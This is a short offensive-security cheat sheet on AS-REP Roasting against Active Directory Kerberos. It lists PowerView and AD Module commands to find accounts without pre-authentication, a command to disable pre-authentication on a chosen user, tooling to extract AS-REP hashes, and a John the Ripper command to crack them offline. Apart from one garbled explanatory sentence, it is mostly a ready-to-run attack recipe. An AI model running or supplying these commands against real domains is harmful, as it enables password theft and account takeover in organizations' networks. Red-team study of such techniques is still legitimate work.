# AS-REP Roasting

**AS-REP Roasting** exploits Kerberos accounts with **"`Do not require preauthentication`"** enabled.

in usually user when will try to login it must to send timestamp encrypted with NT Hash to proof it’s know the password but this option was disable timestamp

* Attacker requests an AS-REP without knowing the password.
* The KDC returns an encrypted AS-REP ticket (encrypted with user’s NTLM hash).
* Attacker cracks it offline to recover the plaintext password.

***

## Enumeration

**Enumerating accounts with Kerberos pre-authentication disabled**

```powershell
# powerView
Get-DomainUser -PreauthNotRequired -Verbose

# AD Module
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth
```

**Disable pre-authentication**

if you have( Write Permissions / GenericAll / Domain Admin) privilege

```powershell
Set-DomainObject -Identity <User> -XOR @{useraccountcontrol=4194304} -Verbose
```

**Retrieve the hash**

```powershell
Get-ASREPHash -UserName VPN1user -Verbose
Invoke-ASREPRoast -Verbose
```

**Crack**

```powershell
john.exe --wordlist=passwords.txt asrephashes.txt
```
